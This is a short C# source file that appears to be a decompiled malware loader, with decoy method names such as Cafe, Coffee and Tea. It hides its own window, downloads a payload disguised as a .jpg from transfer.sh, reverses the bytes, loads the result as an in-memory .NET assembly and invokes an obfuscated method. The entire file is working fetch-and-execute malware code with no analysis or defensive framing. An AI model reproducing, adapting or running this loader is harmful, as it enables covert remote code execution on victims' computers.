using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;

namespace Todbja;

internal class Program
{
	private static string fileName { get; set; }

	[STAThread]
	private static void Main(string[] args)
	{
		IntPtr mainWindowHandle = Process.GetCurrentProcess().MainWindowHandle;
		Native.ShowWindow(mainWindowHandle, 0);
		Ping();
		Cafe();
		Tea();
	}

	private static void Cafe()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		fileName = Assembly.Load(Coffee().ToArray()).FullName;
		if (fileName == null)
		{
			throw new Exception();
		}
	}

	private static List<byte> Coffee()
	{
		List<byte[]> list = new List<byte[]>();
		List<byte> list2 = new List<byte>();
		list.Add(new BinaryReader(WebRequest.Create("http://transfer.sh/get/bwkgO4/Daggl.jpg").GetResponse().GetResponseStream()).ReadBytes(88772362));
		byte[] array = list[0];
		foreach (byte item in array)
		{
			list2.Add(item);
		}
		list2.Reverse();
		return list2;
	}

	private static void Tea()
	{
		if (fileName == null)
		{
			return;
		}
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			if (assembly.FullName == fileName)
			{
				Type type = assembly.GetType("Skmojkdepdqlpypbaysarjp.Obfybrrn");
				MethodInfo method = type.GetMethod("Turabklfkcb");
				string value = (string)method.Invoke(null, null);
				Console.WriteLine(value);
			}
		}
	}

	private static void Ping()
	{
	}
}
